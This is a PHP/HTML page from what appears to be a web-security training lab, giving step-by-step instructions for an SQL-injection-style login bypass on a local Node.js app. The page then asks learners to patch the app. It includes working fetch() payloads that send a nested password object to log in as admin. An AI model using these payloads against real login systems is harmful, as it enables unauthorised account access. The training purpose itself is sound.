<!DOCTYPE html>
<html lang="en">
<!--Common Headers-->
<?php
    require_once 'common_header.php';
?>

<?php
    require_once 'common_session_no.php';
?>
<?php
$command = 'docker logs docker_xss_1 2>&1';
$output = shell_exec($command);

echo "<!-- Debug: Output Length: " . strlen($output) . " -->"; // Check if logs are being fetched

$iframeSrc = "https://websechomeserver.ddns.net:3201"; // Default source

$searchPattern = '/\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3} \[PRIO\] Connections: accepted:/';
$matches = [];
if (preg_match_all($searchPattern, $output, $matches)) {
    echo "<!-- Debug: Matches Found: " . count($matches[0]) . " -->"; // Check if pattern matches
    $iframeSrc = "https://websechomeserver.ddns.net:3203"; // New source to redirect to
} else {
    echo "<!-- Debug: No Matches -->";
}

// HTML follows
?>

<head>
    <title>SQLi Challenge Instructions</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
        }
        .container {
            display: flex;
            height: 100%;
        }
        .instructions {
            flex: 1;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            overflow-y: auto;
        }
        .iframe-container {
            flex: 3;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        iframe {
            width: 100%;
            height: calc(100% - 40px);
            border: none;
        }
        h2 {
            color: #333;
        }
        ol {
            line-height: 1.6;
        }
        li {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="instructions">
        <h2>SQLi Challenge Instructions</h2>
        <ol>
            <li>Start the mysql service and the nodeJs app:
                <br><code>sudo service mysql start</code>
                <br><code>node /config/Desktop/SQLI-1/login.js</code>
            </li>
            <li>Open the web browser and navigate to <code>http://localhost:8080</code></li>
            <li>Using Developer Tools, capture the HTTP request and response using the Network tab. By entering a random username and password on the website, the auth endpoint will be shown on the Developer Tools.</li>
            <li>You can copy the authentication request as fetch() code to execute it as JavaScript code in the Console tab.</li>
            <li>Removing the verbose information from the code, we get:
                <pre>fetch("http://127.0.0.1:8080/auth", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "username=admin&password=12341234test",
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => console.log(r));</pre>
            </li>
            <li>Edit the code as shown below to perform the exploit:
                <pre>fetch("http://127.0.0.1:8080/auth", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "username=admin&password[password]=1",
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => console.log(r));

OR

data = {
  username: "admin",
  password: {
    password: 1,
  },
};
fetch("http://127.0.0.1:8080/auth", {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify(data),
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => console.log(r));</pre>
            </li>
            <li>You can then navigate to the home directory and see that you're logged in as admin.</li>
            <li>You can now modify the source codes in the SQLI-1 folder to try and prevent the SQLI attack.</li>
            <li>After modifying, start up the nodeJs app again and test using the same input as before.</li>
            <li>If the webpage does not allow the login bypass, you have completed this challenge.</li>
            <li>Repeat if unsuccessful in defending.</li>
        </ol>
    </div>
    <div class="iframe-container">
        <iframe src="https://websechomeserver.ddns.net:3201" frameborder="0"></iframe>
    </div>
</div>

</body>
</html>
